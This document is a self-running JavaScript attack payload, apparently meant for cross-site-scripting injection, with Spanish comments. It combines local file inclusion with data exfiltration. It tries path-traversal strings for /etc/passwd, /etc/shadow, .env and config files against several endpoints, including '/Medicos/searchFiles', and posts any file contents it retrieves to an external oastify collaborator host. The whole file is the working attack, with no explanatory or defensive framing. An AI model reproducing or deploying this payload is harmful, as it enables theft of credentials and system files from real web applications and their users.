(function(){
  var burp="http://w630bbm6tppekzwbv9aovobqlhr8f03p.oastify.com/";
  
  var lfi_payloads=[
    "../../../etc/passwd",
    "../../../etc/shadow",
    "../../../windows/win.ini",
    "../../../windows/system32/drivers/etc/hosts",
    "../../config/database.php",
    "../../config/config.php",
    "../.env",
    "../../.env",
    "../../../.env",
    "/etc/passwd",
    "/etc/shadow",
    "/var/www/html/config.php",
    "c:\\windows\\win.ini",
    "c:\\windows\\system32\\drivers\\etc\\hosts"
  ];
  
  var results={
    timestamp:new Date().toISOString(),
    attack:"LFI + XSS",
    files_found:[],
    lfi_attempts:0
  };
  
  // Intentar LFI en múltiples endpoints
  var endpoints=[
    "/Medicos/searchFiles",
    "/files",
    "/downloads",
    "/upload",
    "/view",
    "/read"
  ];
  
  endpoints.forEach(function(endpoint){
    lfi_payloads.forEach(function(payload){
      results.lfi_attempts++;
      
      fetch(endpoint+'?file='+encodeURIComponent(payload))
      .then(r=>r.text())
      .then(content=>{
        if(content.length>0 && content.indexOf('root')>-1){
          results.files_found.push({
            endpoint:endpoint,
            payload:payload,
            size:content.length,
            content:content.substring(0,500)
          });
          fetch(burp,{method:'POST',mode:'no-cors',body:JSON.stringify(results)}).catch(function(){});
        }
      })
      .catch(function(){});
    });
  });
  
  // También intentar con parámetros GET/POST comunes
  var params=['file','path','url','doc','document','id','view','read'];
  
  params.forEach(function(param){
    lfi_payloads.forEach(function(payload){
      fetch('/Medicos/searchFiles?'+param+'='+encodeURIComponent(payload))
      .then(r=>r.text())
      .then(content=>{
        if(content.length>100){
          results.files_found.push({
            param:param,
            payload:payload,
            size:content.length
          });
        }
      })
      .catch(function(){});
    });
  });
  
  setTimeout(function(){
    fetch(burp,{method:'POST',mode:'no-cors',body:JSON.stringify(results)}).catch(function(){});
  },5000);
})();
